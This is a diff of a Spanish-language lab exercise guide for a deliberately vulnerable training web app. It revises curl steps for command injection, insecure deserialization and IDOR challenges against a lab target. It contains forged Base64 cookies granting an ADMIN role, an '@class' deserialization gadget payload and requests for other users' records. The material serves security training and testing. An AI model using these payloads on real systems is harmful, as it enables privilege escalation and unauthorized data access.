@@ -1620,7 +1620,7 @@ El campo isValid se fija a true en el wrapper y no es un indicador de ejecución
 
 ### commandInjection-02 · LEVEL_1 — marcador seguro de ejecución de la shell
 
-Si el laboratorio está desplegado con esta implementación, content debe contener VA_LAB_OK porque la entrada llega a sh -c. El resto de la salida puede contener errores o salida de ping; no se exige texto exacto.
+Si el laboratorio está desplegado con esta implementación, content debe ser exactamente VA_LAB_OK porque la entrada llega a sh -c. El wrapper del target silencia el diagnóstico de ping y el lector del ejercicio elimina el separador final, por lo que el marcador es determinista.
 
 **Puntaje:** 100 XP. Evidencia observada por el runner de Kali.
 
@@ -2786,7 +2786,7 @@ El formulario permite solo light/dark, pero el GET confía en cualquier Base64(J
 
 1. Control negativo: emitir una cookie legítima y observar solo la cabecera sin asumir que el reto está resuelto: curl -i -c /tmp/va-deser-l1.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H 'Content-Type: application/x-www-form-urlencoded' --data 'theme=dark&notificationsEnabled=true'
 
-2. Comprobar la cookie legítima: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -b /tmp/va-deser-l1.cookies -H 'Accept: application/json'
+2. Comprobar la cookie legítima (curl 8.22 no reutiliza jars para el hostname Docker): curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H "Cookie: preferences_level1=$(awk -v name=preferences_level1 '$6==name{print $7}' /tmp/va-deser-l1.cookies)" -H 'Accept: application/json'
 
 3. Control positivo seguro, sin ejecutar nada en el servidor: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H 'Accept: application/json' -H 'Cookie: preferences_level1=eyJ0aGVtZSI6IkhBQ0tFRCIsIm5vdGlmaWNhdGlvbnNFbmFibGVkIjp0cnVlfQ=='
 
@@ -2821,7 +2821,7 @@ El mismo tipo UserPreferences contiene role, y el código usa ese valor directam
 
 1. Iniciar la sesión normal en un jar local: curl -i -c /tmp/va-deser-l2.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H 'Accept: application/json'
 
-2. Control negativo USER: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -b /tmp/va-deser-l2.cookies -H 'Accept: application/json'
+2. Control negativo USER (reutiliza el valor con header explícito): curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H "Cookie: session_level2=$(awk -v name=session_level2 '$6==name{print $7}' /tmp/va-deser-l2.cookies)" -H 'Accept: application/json'
 
 3. Control positivo seguro con el marcador documentado y sin comandos externos: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H 'Accept: application/json' -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ=='
 
@@ -2856,7 +2856,7 @@ Este nivel es el control seguro de la familia. El check solo evita confundir una
 
 1. Obtener una cookie firmada legítima y guardar el Set-Cookie localmente: curl -i -c /tmp/va-deser-l3.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H 'Accept: application/json'
 
-2. Control positivo del camino seguro: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -b /tmp/va-deser-l3.cookies -H 'Accept: application/json'
+2. Control positivo del camino seguro: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H "Cookie: session_level3=$(awk -v name=session_level3 '$6==name{print $7}' /tmp/va-deser-l3.cookies)" -H 'Accept: application/json'
 
 3. Reusar deliberadamente el payload ADMIN sin firma, que sí se acepta en LEVEL_2: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H 'Accept: application/json' -H 'Cookie: session_level3=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ=='
 
@@ -2891,7 +2891,7 @@ El campo @class no es un dato de VisitedSection validado: decide qué clase cons
 
 1. Emitir primero una visita normal, guardando su cookie: curl -i -c /tmp/va-deser-l4.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'section=Level 2'
 
-2. Control negativo con VisitedSection normal: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -b /tmp/va-deser-l4.cookies -H 'Accept: application/json'
+2. Control negativo con VisitedSection normal: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H "Cookie: activity_level4=$(awk -v name=activity_level4 '$6==name{print $7}' /tmp/va-deser-l4.cookies)" -H 'Accept: application/json'
 
 3. Control positivo seguro, limitado a un marcador de auditoría en memoria: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H 'Accept: application/json' -H 'Cookie: activity_level4=eyJAY2xhc3MiOiJvcmcuc2FzYW5sYWJzLnNlcnZpY2UudnVsbmVyYWJpbGl0eS5kZXNlcmlhbGl6YXRpb24uQXVkaXRMb2dHYWRnZXQiLCJub3RlIjoiSEFDS0VEIn0='
 
@@ -3372,11 +3372,11 @@ curl -i -c /tmp/va-idor-l1.cookies -X POST http://target:9090/VulnerableApp/IDOR
 ```
 
 ```bash
-curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=1' -b /tmp/va-idor-l1.cookies
+curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=1' -H "Cookie: token_level1=$(awk -v name=token_level1 '$6==name{print $7}' /tmp/va-idor-l1.cookies)"
 ```
 
 ```bash
-curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=2' -b /tmp/va-idor-l1.cookies
+curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=2' -H "Cookie: token_level1=$(awk -v name=token_level1 '$6==name{print $7}' /tmp/va-idor-l1.cookies)"
 ```
 
 **Criterio del verificador:**
@@ -3390,7 +3390,7 @@ curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-
 
 **Pistas:**
 
-Con -c se conserva el token que el servidor emita; -b lo reenvía sin exponerlo al navegador.
+Con -c se conserva el token que el servidor emita; en curl 8.22 extrae el valor con awk y reenvíalo mediante un header `Cookie:` explícito.
 
 El control propio y la consulta ajena deben usar el mismo cookie jar y cambiar únicamente id.
 
@@ -3411,7 +3411,7 @@ curl -i -c /tmp/va-idor-l2.cookies -X POST http://target:9090/VulnerableApp/IDOR
 ```
 
 ```bash
-curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -b /tmp/va-idor-l2.cookies
+curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -H "Cookie: token_level2=$(awk -v name=token_level2 '$6==name{print $7}' /tmp/va-idor-l2.cookies); userId_level2=$(awk -v name=userId_level2 '$6==name{print $7}' /tmp/va-idor-l2.cookies)"
 ```
 
 Copiar el valor token_level2 de la cabecera Set-Cookie de la respuesta anterior y usarlo sin modificar en el siguiente control de laboratorio:
@@ -3522,7 +3522,7 @@ curl -i -c /tmp/va-idor-l5-alice.cookies -X POST http://target:9090/VulnerableAp
 ```
 
 ```bash
-curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -b /tmp/va-idor-l5-alice.cookies
+curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -H "Cookie: token_level5=$(awk -v name=token_level5 '$6==name{print $7}' /tmp/va-idor-l5-alice.cookies)"
 ```
 
 **Criterio del verificador:**
@@ -3557,7 +3557,7 @@ curl -i -c /tmp/va-idor-l5-charlie.cookies -X POST http://target:9090/Vulnerable
 ```
 
 ```bash
-curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -b /tmp/va-idor-l5-charlie.cookies
+curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -H "Cookie: token_level5=$(awk -v name=token_level5 '$6==name{print $7}' /tmp/va-idor-l5-charlie.cookies)"
 ```
 
 **Criterio del verificador:**
